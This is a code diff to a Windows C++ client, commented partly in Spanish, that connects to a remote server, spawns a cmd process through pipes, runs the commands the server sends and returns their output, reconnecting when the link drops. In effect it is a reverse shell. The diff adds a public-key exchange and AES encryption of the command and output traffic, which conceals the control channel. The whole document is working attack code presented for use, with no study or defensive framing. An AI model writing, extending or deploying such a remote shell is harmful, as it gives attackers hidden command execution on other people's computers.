@@ -3,6 +3,7 @@
 #include<string>
 #include<iostream>
 #include "include/keys.h"
+#include "include/crypto.h"
 #include <windows.h>
 
 
@@ -40,26 +41,28 @@ SOCKET connectToServer(const std::string& ip, int port) {
         return INVALID_SOCKET;
     }
     std::cout << "Connected to server.\n";
+    return s;
+}
 
+std::string send_keys(SOCKET& s){
+    char recvbuf[4096];
+    int m;
     Keys ClientKeys = KeyGeneration();
- 
     m = send(s,ClientKeys.publicKey.c_str(),ClientKeys.publicKey.size(),0); // cambia recvbuf por el mensaje
     if(m == SOCKET_ERROR) {
         std::cerr << "Connection failed.\n";
         closesocket(s);
-        return INVALID_SOCKET;
+        return "";
     };
     m = recv(s, recvbuf, sizeof(recvbuf),0);
-    recvbuf[m] = '\0';
+
     std::cout << "La llave Aes Enc del servidor es: " << recvbuf << std::endl;
     std::string Aes_en(recvbuf, m);
     std::string KeyAes = decryptMessageSeal(fromHex(Aes_en),fromHex(ClientKeys.publicKey),fromHex(ClientKeys.privateKey));
     std::cout << "La llave Aes desencriptada AES es: " << KeyAes<< std::endl;
-
-
-
-    return s;
+    return KeyAes;
 }
+
 
 bool launchCmdProcess(HANDLE& hReadOut, HANDLE& hWriteOut, HANDLE& hReadIn, HANDLE& hWriteIn, PROCESS_INFORMATION& pi) {
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
@@ -83,12 +86,15 @@ bool launchCmdProcess(HANDLE& hReadOut, HANDLE& hWriteOut, HANDLE& hReadIn, HAND
     return true;
 }
 
-void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string& ip, int port) {
+void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string& ip, int port, std::string& KeyAes) {
     char recvbuf[4096];
     DWORD bytesRead;
+    std::vector<unsigned char> key(KeyAes.begin(), KeyAes.end());
+
 
     while (true) {
         int n = recv(s, recvbuf, sizeof(recvbuf), 0);
+        
         if (n <= 0) {
             std::cerr << "\nConexión perdida. Reintentando...\n";
             closesocket(s);
@@ -105,15 +111,21 @@ void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string&
             std::cout << "Reconectado con éxito.\n";
             continue;
         }
+        std::string message_enc(recvbuf,n);
+        std::string messages_dec = decryptAES(key,message_enc);
+        std::cout << messages_dec << std::endl;
+        messages_dec +="\r\n";
 
         DWORD bytesWritten;
-        WriteFile(hWriteIn, recvbuf, n, &bytesWritten, NULL);
+        WriteFile(hWriteIn, messages_dec.c_str(), messages_dec.size(), &bytesWritten, NULL);
         Sleep(100);
 
         do {
             if (ReadFile(hReadOut, recvbuf, sizeof(recvbuf) - 1, &bytesRead, NULL) && bytesRead > 0) {
-                recvbuf[bytesRead] = '\0';
-                int j = send(s, recvbuf, bytesRead, 0);
+                std::string messages_dec(recvbuf,bytesRead);
+                message_enc = encryptAES(key,messages_dec);
+                std::cout << message_enc << std::endl;
+                int j = send(s, message_enc.c_str(), message_enc.size(), 0);
                 if (j == SOCKET_ERROR) break;
             }
         } while (bytesRead == sizeof(recvbuf) - 1);
